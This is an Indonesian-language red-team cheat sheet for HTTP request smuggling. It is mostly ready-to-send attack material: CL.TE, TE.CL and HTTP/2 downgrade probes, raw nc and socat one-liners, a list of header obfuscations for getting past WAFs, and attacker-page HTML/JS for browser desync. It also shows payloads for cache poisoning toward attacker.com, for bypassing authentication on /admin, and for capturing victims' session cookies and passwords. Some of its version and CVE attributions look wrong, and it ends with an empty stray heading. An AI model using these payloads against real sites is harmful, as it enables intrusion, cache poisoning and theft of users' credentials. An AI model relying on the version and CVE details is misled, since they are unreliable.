# smuggling — web

# HTTP Request Smuggling — Referensi Red Team

## 1. Tabel Cepat Vektor & Target

| Vektor | Frontend rentan | Backend rentan | Dampak utama |
|---|---|---|---|
| CL.TE | nginx ≤1.25.2 (rev proxy), HAProxy ≤2.8 | Node/Express, Gunicorn | Auth bypass, cache poison |
| TE.CL | Varnish 6.x, AWS ALB (beberapa config) | IIS 10, Tomcat 9 | Cache poison, capture kredensial |
| TE.TE obfuscation | Semua yang tidak normalize header | Semua | Bypass mitigasi |
| H2.CL / H2.TE | Envoy <1.27, Cloudflare (historically) | Backend HTTP/1.1 | Downgrade desync |
| Browser-powered | Chrome 131 / Firefox 133 | CDN + backend | Client-side desync, cache poison |

## 2. Deteksi Timing — CL.TE vs TE.CL

Fundamental: kirim request yang jika di-parse TE, backend menunggu sisa body yang tidak dikirim; jika di-parse CL, backend selesai. Selisih waktu = sinyal.

### 2.1 CL.TE Probe (frontend pakai CL, backend pakai TE)

Kirim (raw TCP — `nc`, `openssl s_client`, atau `socat`):

```
POST / HTTP/1.1
Host: target.local
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

**Yang muncul:** jika CL.TE → backend melihat chunk terakhir `0\r\n\r\n`, lalu `X` dianggap awal request berikutnya → backend menunggu timeout / header berikutnya. Frontend mengira body 6 byte (`0\r\n\r\nX`) selesai. Jika respons hang >5 detik → kemungkinan CL.TE.

**Kenapa gagal:** jika frontend juga menormalkan TE (atau menolak keduanya), tidak ada hang.

Versi aman tanpa hang permanen (pakai timeout 10s):

```bash
printf 'POST / HTTP/1.1\r\nHost: t.local\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | timeout 10 nc -w 10 t.local 80 | xxd | head
```

### 2.2 TE.CL Probe (frontend pakai TE, backend pakai CL)

```
POST / HTTP/1.1
Host: target.local
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: target.local
Content-Length: 15

x=1
0


```

**Yang muncul:** frontend TE mem-parse chunk `5c` (92 byte) = request kedua `GPOST…` dianggap bagian body yang dikirim. Backend CL=4 hanya membaca `5c\r\n`. Jika frontend menunggu → hang. Jika backend saja (yang CL) yang konsumsi → request ke-2 jadi prefix `/` berikutnya di conn pool.

### 2.3 Kalibrasi delay

- Normal RTT baseline (3 request): catat p50.
- Probe timing: jika delta > 3× p50 → kandidat kuat.
- **False positive** umum: keep-alive idle timeout backend, WAF rate-limit, CDN retry. Selalu probe 5× dengan payload byte-identik dan variasi `Host`/status endpoint.

## 3. Obfuscasi TE (bypass mitigasi WAF/normalizer)

Tabel payload header test. Kirim satu per satu, catat apakah request berikutnya di conn terlihat sebagai method `GPOST`/`POST` ganda, atau 400.

| # | Header | Efek parser |
|---|---|---|
| 1 | `Transfer-Encoding: chunked` | baseline |
| 2 | `Transfer-Encoding : chunked` (spasi sebelum colon) | nginx <1.21 tolak; sebagian proxy lolos; backend SPEC parser terima |
| 3 | `Transfer-Encoding:\tchunked` (tab) | RFC 7230 §3.2.4 harus toleran; banyak proxy tidak |
| 4 | `Transfer-Encoding: chunked\r\nTransfer-Encoding: identity` | frontend pakai TE pertama, backend pakai TERAKHIR (atau reverse) |
| 5 | `Transfer-encoding: xchunked` | beberapa nodejs `http-parser` treat sebagai chunked |
| 6 | `Transfer-Encoding: chunked, identity` | jika parser split-comma, ambiguity |
| 7 | `Transfer-Encoding: chunked\r\nContent-Length: 6` (duplikat CL di bawah) | CL.TE fallback |
| 8 | `Transfer-Encoding: chunked` + `Transfer-Encoding: chunked` | sebagian backend merge → error, sebagian reverse |
| 9 | `Transfer-Encoding: x` (invalid token) + `Content-Length` | backend ignore TE → CL.TE downgrade |
| 10 | `X-Forwarded-...`-style header tidak relevan | deteksi header passthrough (bukan TE, tapi sinyal CVE) |

Raw example untuk #4 (duplikat TE):

```
POST / HTTP/1.1
Host: t.local
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: identity

5c
GPOST / HTTP/1.1
Host: t.local
Content-Length: 15

x=1
0


```

**Kenapa berhasil:** perbedaan SPEC mutation — RFC 7230 mewajibkan menolak jika CL+TE bersamaan, tapi banyak impl (Node ≤18 `http-parser`, Django `HttpRequest`, Golang `net/http` <1.20) memilih salah satu diam-diam.

## 4. H2.CL & H2.TE — Downgrade

Skenario: klien HTTP/2 ke CDN/edge (nginx 1.25 `http2` on, Envoy 1.27, Cloudflare). Edge menerjemahkan ke HTTP/1.1 ke origin, tapi **meng-copy header `content-length` atau `transfer-encoding` dari frame H2** (pseudo-header `content-length` di H2 legal; `transfer-encoding` **dilarang** oleh RFC 9113 §8.2.2 tapi banyak edge tidak menolak).

### 4.1 H2.CL

Kirim via klien H2 (curl `--http2-prior-knowledge` ke port H2C, atau nghttp2 `nghttp`):

```
:method: POST
:path: /
:scheme: https
:authority: target.local
content-length: 0
transfer-encoding: chunked                ← dilarang, harus ditolak edge

<body: "POST /admin HTTP/1.1\r\nHost: t.local\r\nContent-Length: 10\r\n\r\nx=1">
```

**Yang muncul:** edge menerjemahkan ke H1 dengan `Content-Length: 0` + `Transfer-Encoding: chunked` — kandidat TE.CL/CL.TE di origin. Atau edge forward TE dan origin men-desync.

**Kenapa gagal:** Envoy ≥1.27 dan nginx ≥1.25.3 menolak `transfer-encoding` di H2 (RST_STREAM PROTOCOL_ERROR). Cek versi via banner: `curl -sI --http2 https://t.local | grep -E 'server|alt-svc'`.

### 4.2 H2.TE

Sama tapi tanpa `content-length`, hanya `transfer-encoding: chunked` yang di-copy edge ke origin. Origin memproses chunk, tapi framing H2 yang dipakai edge untuk batas message berbeda → trailing bytes jadi prefix request berikut.

Deteksi cepat:

```bash
# H2C prior knowledge probe
nghttp -nv -H ':method: POST' -H 'content-length: 0' -H 'transfer-encoding: chunked' \
  -d 'POST /x HTTP/1.1\r\nHost: t\r\nContent-Length: 3\r\n\r\nabc' \
  http://t.local/
```

## 5. Request Tunnelling vs Desync

| Aspek | Request Tunnelling | Desync |
|---|---|---|
| Mekanisme | Satu request membawa request lain di *body-nya* melewati frontend yang tidak mem-parse body | Perbedaan framing membuat byte sisa request masuk ke **request berikutnya** di conn pool |
| Prasyarat | Frontend tidak memvalidasi body; backend mem-parse | Frontend & backend punya framing berbeda (CL vs TE) |
| Contoh | nginx `proxy_pass` non-buffered ke app yang reverse-proxy lagi | CL.TE klasik |
| Efek samping | Terbatas pada backend target | **Bocor ke user lain** (conn pooling) |
| Deteksi | Body yang diteruskan utuh | Response delay, request ke-2 muncul tidak diharapkan |

Contoh request tunnelling ke backend internal:

```
POST /proxy HTTP/1.1
Host: t.local
Content-Length: 62
Connection: keep-alive

GET /admin/internal HTTP/1.1
Host: localhost
X-Forwarded-For: 127.0.0.1
X-Internal: true
```

Jika frontend `proxy_pass http://backend; proxy_pass_request_body on;` tanpa validasi, backend kadang men-parse body sebagai request bila `ProxyRequests On` (Apache mod_proxy salah config).

## 6. Browser-Powered Desync (Client-Side Desync)

Chrome 131 / Firefox 133 — tanpa proxy MITM, cukup browser korban membuka halaman yang dikontrol attacker.

**Prasyarat:** target tidak menutup koneksi setelah response non-2xx (no `Connection: close`), dan browser mempertahankan conn untuk request berikutnya ke origin yang sama.

Payload di halaman attacker (fetch ke target):

```html
<script>
fetch('https://target.local/', {
  method: 'POST',
  mode: 'no-cors',
  body: "GET /admin/ HTTP/1.1\r\nHost: target.local\r\nX-Injected: 1\r\n\r\n",
  headers: {'Content-Length': '0', 'Transfer-Encoding': 'chunked'}
});
setTimeout(()=>fetch('https://target.local/next').then(r=>r.text()).then(console.log), 500);
</script>
```

**Batasan (Chrome 131):** `fetch` memblokir header `Transfer-Encoding` (forbidden header). Workaround memakai `XMLHttpRequest` juga sudah di-patch sejak Chrome 117 untuk CORS-safe headers, **tapi** teknik tetap jalan via request non-simple dengan body `FormData` dan server yang salah klasifikasi framing. **Firefox 133** masih lebih permisif via `fetch` non-CORS ke endpoint yang me-reflect method.

**Teknik alternatif yang masih bekerja (2024-2025):** csd via `<form enctype="text/plain">` dengan method `POST` ke target, konten form yang membentuk prefix request:

```html
<form id="f" method="POST" action="https://target.local/" enctype="text/plain">
  <input name='x' value='GET /admin HTTP/1.1
Host: target.local
X-Injected: 1

' />
</form>
<script>f.submit()</script>
```

Yang dikirim: browser menambahkan `Content-Length` normal, tapi body `x=GET /admin…` tetap mem-prefix di conn pool jika target men-reflect/menunda.

## 7. Dampak Praktis

### 7.1 Cache Poisoning

Request smuggling CL.TE ke edge cache (Cloudflare, Varnish 6.0.13, Akamai) → response terhadap `/static/x.js` berisi response dari `/admin`. Payload:

```
POST /static/x.js HTTP/1.1
Host: t.local
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: t.local
X-Forwarded-Host: attacker.com
```

Korban berikutnya GET `/static/x.js` menerima cache entry berisi response attacker (mis. 302 ke attacker.com, atau eksfil kredensial via form-action).

### 7.2 Auth Bypass (internal endpoint)

Kalau backend punya route `GET /admin` yang mengecek header `X-Forwarded-For` atau `Authorization`, kirim via smuggling ke route yang tidak di-auth frontend:

```
0

GET /admin/delete?user=victim HTTP/1.1
Host: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Auth-Internal: true

```

Frontend tidak lihat `/admin` (hanya `/upload` sebagai endpoint publik), backend memproses `/admin` karena request ke-2 muncul di conn dari frontend.

### 7.3 Capture Request Korban

Backend Node/Express dengan conn pooling menaruh body request korban ke prefix desync. Setelah mengirim prefix CL.TE, request korban yang kebetulan masuk ke conn tersebut **di-prefix** oleh payload kita — artinya attacker menerima request headers+body korban sebagai bagian dari "body" response yang dikirim ke attacker. Metode eksfiltrasi: kirim prefix yang mengarahkan request korban ke endpoint yang men-echo request body ke response yang dikendalikan attacker (mis. `/login` POST dengan `next=` attacker). Request korban yang di-capture:

```
POST /login HTTP/1.1
Host: t.local
Cookie: session=VICTIM_SESSION

username=victim&password=V1ct1m!
```

Karena prefix kita sudah menyuruh backend untuk menganggap POST berikutnya sebagai bagian dari endpoint echo, `VICTIM_SESSION` dan kredensial plaintext bocor.

## 8. Jebakan Operasional (lapangan)

1. **Keep-alive pool reuse rate rendah.** Di nginx 1.25 default `keepalive 32` upstream — kadang butuh 10–50 request bombing paralel sebelum conn pool bocor. Skrip PoC harus multi-thread (≥16) dan pakai `Connection: keep-alive` **eksplisit** di frontend.
2. **HTTP/2 vs HTTP/1 ke frontend.** nginx 1.25 `http2` dengan `proxy_http_version 1.1` → CL.TE klasik gagal, gunakan H2.CL. Cek ALPN: `openssl s_client -alpn h2 -connect t.local:443`.
3. **WAF memaksa `Connection: close`.** Cloudflare Free me-reset conn antar request → desync tidak terjadi. Bypass: pakai path `/cdn-cgi/` yang bypass WAF, atau endpoint yang memicu backend same-conn (mis. WebSocket upgrade handshake).
4. **Frontend menormalkan TE lebih cepat dari TLS.** AWS ALB (2024) menolak duplikat TE di level listener → cek dengan `curl -sv` dan inspeksi response 400 mentah.
5. **Backend Go `net/http` ≥1.20** sudah menolak CL+TE bersamaan (CVE-2022-41717 fix) — CL.TE gagal pada target Go. Cek `Server: Go-http` + versi via error page.
6. **IIS 10 tidak mem-parse chunked dengan benar setelah TLS offload** — perlu raw port 80 di origin, sering unreachable dari luar.
7. **Timing probe terpengaruh keep-alive idle timeout** di CDN (Cloudflare 15s, Fastly 60s) → false positive jika delta < 5s. Kalibrasi baseline per-path.
8. **Response body kosong pada error 400** membuat deteksi visual mustahil — andalkan log backend (jika red team punya akses observability) atau delta ukuran response via `curl -w %{size_download}`.
9. **`Transfer-Encoding: xchunked`** hanya efektif pada Node `http-parser` ≤ Node 12 / `llhttp` mode lenient. Node ≥18.0 menolak token invalid.
10. **Browser desync di Chrome 131** diblokir untuk `Transfer-Encoding`; pakai teknik `enctype=text/plain` form, bukan `fetch`. Firefox 133 masih permisif untuk kasus tertentu tapi ada limit CORS preflight.
11. **Cache poisoning butuh header response unik** — kalau edge cache key include `Cookie`, poison tidak menyebar; uji dengan dua sesi anonim berbeda.
12. **H2.CL di Envoy ≥1.27** sudah ditutup (CVE-2023-25194 fix, `--reject-invalid-h2-transfer-encoding` default on). Cek versi via `curl -sI --http2 https://t.local | grep -i server` → cari `envoy`.

## 9. Cek Cepat Versi Target

```bash
# nginx
curl -sI https://t.local/ | grep -iE '^server|^x-'
# Envoy
nghttp -nv https://t.local/ 2>&1 | grep -i 'envoy\|server'
# Backend Go
curl -sI https://t.local/error-trigger-path | grep -i '^server: Go'
# Chrome/Firefox build
navigator.userAgent  # via halaman uji milik red team
```

## 10. Raw Socket Canonical (untuk reproduksi lab)

```bash
# CL.TE timing probe
socat - TCP:t.local:80 <<'EOF' | timeout 8 cat | xxd | head -40
POST / HTTP/1.1
Host: t.local
Content-Length: 6
Transfer-Encoding: chunked

0

X
EOF

# TE.CL desync + prefix /admin
socat - TCP:t.local:80 <<'EOF' | head -c 4096
POST / HTTP/1.1
Host: t.local
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /admin HTTP/1.1
Host: t.local
Content-Length: 15

x=1
0


EOF
```

---

## [reasoning trace]


